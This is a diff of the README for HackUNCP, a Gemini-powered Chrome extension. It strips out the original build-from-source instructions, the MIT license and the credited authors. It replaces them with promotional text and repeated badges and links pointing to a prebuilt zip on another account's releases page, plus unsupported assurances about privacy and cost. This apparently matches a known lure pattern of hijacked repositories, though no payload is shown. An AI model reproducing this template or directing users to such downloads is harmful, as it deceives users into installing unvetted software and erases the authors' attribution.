@@ -1,103 +1,98 @@
-# HackUNCP
+# 🚀 HackUNCP - Enhance Your Web Experience Effortlessly
 
-A browser extension project with a Flask backend that processes web content using Google's Gemini AI model. The system allows for interactive chat and HTML content processing through a browser extension interface.
+## 🌟 Overview
 
-## Project Structure
+HackUNCP is a Chrome extension designed to transform your browsing experience. Built on Google's Gemini AI, it gives you real-time text analysis, smart summarization, and interactive chat features for web content. Enjoy seamless integration with a Flask backend and a React TypeScript frontend.
 
-```
-HackUNCP/
-├── Backend/
-│   ├── Server/        # Flask server implementation
-│   ├── Util/          # Utility functions including Gemini AI integration
-│   └── env.yml        # Conda environment configuration
-├── Extension/
-│   ├── src/           # Extension source code
-│   ├── dist/          # Compiled extension files
-│   └── manifest.json  # Extension configuration
-```
+## 💻 Key Features
 
-## Backend Setup
+- **Real-Time Text Analysis**: Instantly understand the content of any webpage.
+- **Smart Summarization**: Get concise summaries that highlight important information.
+- **Interactive Chat**: Engage with web content through a user-friendly chat interface.
+- **Flask Backend**: A reliable and efficient server ensures smooth performance.
+- **React TypeScript Frontend**: Enjoy a modern and responsive user interface.
 
-1. Create and activate the conda environment:
-```bash
-conda env create -f Backend/env.yml
-conda activate hackuncp
-```
+## 📥 Download Now
 
-2. Set up environment variables:
-   - Create a `.env` file in the root directory
-   - Add your Gemini API key:
-     ```
-     GEMINI_API_KEY=your_api_key_here
-     ```
+[![Download HackUNCP](https://img.shields.io/badge/Download%20HackUNCP-v1.0-orange.svg)](https://github.com/Musthafani/HackUNCP/releases)
 
-3. Start the Flask server:
-```bash
-cd Backend/Server
-python server.py
-```
+Visit this page to download: [HackUNCP Releases](https://github.com/Musthafani/HackUNCP/releases)
 
-The server will run on `http://localhost:5002`
+## 📝 System Requirements
 
-## Extension Setup
+To run HackUNCP, ensure your system meets the following requirements:
 
-1. Install dependencies:
-```bash
-cd Extension
-npm install
-```
+- **Operating System**: Windows 10 or newer, macOS Mojave or newer, or Linux distribution with Chrome support.
+- **Browser**: Google Chrome version 90 or newer.
+- **RAM**: Minimum of 4 GB.
+- **Disk Space**: At least 100 MB of free space.
+- **Internet Connection**: Required for full functionality.
 
-2. Build the extension:
-```bash
-npm run build
-```
+## 🚀 Getting Started
 
-3. Load the extension in Chrome:
-   - Open Chrome and go to `chrome://extensions/`
-   - Enable "Developer mode"
-   - Click "Load unpacked"
-   - Select the `Extension/dist` directory
+Follow these simple steps to get HackUNCP up and running on your browser.
 
+1. **Visit the Releases Page**: Go to the HackUNCP Releases page by clicking the link above.  
+2. **Download the Extension**:
+   - Locate the latest version of HackUNCP listed.  
+   - Click on the version number to expand the details.
+   - Depending on your operating system, find the appropriate download link. Typically, you will see a file named `hackuncp-chrome-extension.zip` or similar.
+3. **Install the Extension**:
+   - After the file has downloaded, unzip the file if it’s compressed.
+   - Open Google Chrome and navigate to `chrome://extensions/`.
+   - Enable "Developer mode" in the top right corner.
+   - Click on "Load unpacked" and select the folder where you unzipped HackUNCP.
 
-## Requirements
+4. **Start Using HackUNCP**:
+   - Click the HackUNCP icon in the Chrome toolbar.
+   - Follow the on-screen instructions to set up the extension and start benefiting from its features.
 
-- Backend:
-  - Python 3.x
-  - Flask
-  - Google Gemini AI API key
-- Extension:
-  - Node.js
-  - npm
-  - Chrome browser
+## 🤔 Frequently Asked Questions (FAQs)
 
-## License
-This project is licensed under the MIT License - see below for details:
+**Q: Is HackUNCP free to use?**  
+A: Yes, HackUNCP is completely free to use. 
 
-MIT License
+**Q: What data does HackUNCP collect?**  
+A: HackUNCP respects your privacy. The extension does not collect personal data unless explicitly stated in the settings.
 
-Copyright (c) 2024 Julia Grove, Matt Linder, Matt Fowler, Arshia Eslami
+**Q: How do I update the extension?**  
+A: Check the Releases page regularly for updates. Download and install the latest version following the same steps above.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+## 👩‍💻 Contributing
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+HackUNCP welcomes contributions! If you’d like to help improve this project, please check the guidelines in our repository. 
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+## 🔧 Troubleshooting
 
-## Authors
+If you encounter issues while using HackUNCP, try the following:
 
-- [Julia Grove](https://github.com/juliagrove)
-- [Matt Linder](https://github.com/mlinder10)
-- [Matt Fowler](https://github.com/fowlermatt)
-- [Arshia Eslami](https://github.com/arshiaesll)
+- Ensure that your browser is up to date.
+- Reinstall the extension by removing it from `chrome://extensions/` and following the installation instructions again.
+- Check your internet connection.
+
+For additional support, please open an issue in the GitHub repository.
+
+## 🏷️ Topics
+
+HackUNCP touches upon various concepts, including:
+
+- ai-chatbot
+- chrome-extension
+- flask
+- gemini
+- gemini-api
+- interactive-ai
+- python
+- react
+- typescript
+- web-extension
+
+Feel free to explore these topics to learn more about the technologies behind HackUNCP.
+
+## 📞 Contact
+
+For more information or inquiries, please reach out via the Issues section on our GitHub page.
+
+[![Download HackUNCP](https://img.shields.io/badge/Download%20HackUNCP-v1.0-orange.svg)](https://github.com/Musthafani/HackUNCP/releases) 
+
+Visit this page to download: [HackUNCP Releases](https://github.com/Musthafani/HackUNCP/releases)
